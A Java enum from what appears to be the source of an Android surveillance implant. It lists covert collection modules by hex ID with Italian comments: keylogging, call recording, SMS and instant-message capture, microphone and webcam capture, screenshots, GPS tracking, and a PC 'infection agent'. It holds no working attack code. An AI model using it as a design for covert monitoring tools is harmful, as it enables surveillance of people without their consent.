package com.ht.RCSAndroidGUI.agent;

import java.util.Hashtable;
import java.util.Map;

public enum AgentType {

	AGENT_INFO(0x1000 + 0x0),

	AGENT_SMS(0x1000 + 0x1), // Agente di cattura delle Email/Sms/Mms

	AGENT_TASK(0x1000 + 0x2), // Agente per la cattura degli appuntamenti

	AGENT_CALLLIST(0x1000 + 0x3), // Agente per la cattura della lista delle chiamate

	AGENT_DEVICE(0x1000 + 0x4), // Agente per la cattura delle informazioni sul device

	AGENT_POSITION(0x1000 + 0x5), // Agente per la cattura della posizione GPS o celle GSM

	AGENT_CALL(0x1000 + 0x6), // Agente per la cattura delle chiamate con conference call

	AGENT_CALL_LOCAL(0x1000 + 0x7), // Agente per la
	// registrazione in
	// situ delle
	// chiamate

	AGENT_KEYLOG(0x1000 + 0x8), // Agente per la cattura
	// dei tasti battuti su
	// tastiera

	AGENT_SNAPSHOT(0x1000 + 0x9), // Agente per la
	// cattura degli
	// snapshot dello
	// schermo

	AGENT_URL(0x1000 + 0xa), // Agente per la cattura
	// degli URL visitati

	AGENT_IM(0x1000 + 0xb), // Agente per la cattura
	// degli IM

	AGENT_EMAIL(0x1000 + 0xc), // Non utilizzato (fa
	// tutto AGENT_SMS)

	AGENT_MIC(0x1000 + 0xd), // Agente per la cattura
	// del microfono

	AGENT_CAM(0x1000 + 0xe), // Agente per la cattura
	// degli snapshot dalle
	// webcam

	AGENT_CLIPBOARD(0x1000 + 0xf), // Agente per la
	// cattura degli
	// appunti

	AGENT_CRISIS(0x1000 + 0x10), // Agente di Crisis

	AGENT_APPLICATION(0x1000 + 0x11), // Agente per la
	// cattura delle
	// applicazioni
	// avviate o
	// fermate
	AGENT_LIVEMIC(0x1000 + 0x12),

	AGENT_PDA(0xDF7A); // Solo per PC (infection agent)

	/** Agents definitions. */
	final public static int AGENT = 0x1000;

	private int value;

	private AgentType(int value) {
		this.value = value;
		Aliases.map.put(value, this);
	}

	public static AgentType get(int value) {
		return Aliases.map.get(value);
	}

	/**
	 * Value.
	 * 
	 * @return the int
	 */
	public int value() {
		return value;
	}

	/**
	 * map of aliases to enum constants
	 */
	private static final class Aliases {

		/**
		 * map from name no enum constant
		 */
		static final Map<Integer, AgentType> map = new Hashtable<Integer, AgentType>();
	}

}
